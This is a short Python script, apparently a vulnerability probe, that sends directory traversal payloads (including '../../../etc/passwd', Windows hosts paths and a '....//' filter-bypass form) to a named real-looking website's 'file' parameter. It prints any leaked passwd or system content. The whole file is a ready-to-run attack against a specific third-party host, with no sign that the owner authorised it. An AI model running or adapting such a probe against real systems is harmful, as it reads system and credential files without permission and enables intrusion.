#!/usr/bin/env python3
import requests

def test_directory_traversal():
    print("Testing Directory Traversal Vulnerability")
    print("=" * 50)
    
    target = "https://uplinkai.in/"
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    # Test various directory traversal payloads
    payloads = [
        '../../../etc/passwd',
        '../../../etc/hosts',
        '../../../proc/version',
        '../../../windows/system32/drivers/etc/hosts',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd'
    ]
    
    for payload in payloads:
        try:
            print(f"\nTesting payload: {payload}")
            response = session.get(f"{target}?file={payload}", timeout=10)
            
            print(f"Status Code: {response.status_code}")
            print(f"Response Length: {len(response.text)}")
            
            # Check for sensitive content
            if 'root:' in response.text:
                print("🚨 FOUND /etc/passwd content!")
                print("Sample content:")
                print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
            elif 'localhost' in response.text:
                print("Found hosts file content")
            elif 'Linux' in response.text or 'version' in response.text:
                print("Found system version info")
            else:
                print("No obvious sensitive content found")
                
        except Exception as e:
            print(f"Error testing {payload}: {e}")

if __name__ == "__main__":
    test_directory_traversal()
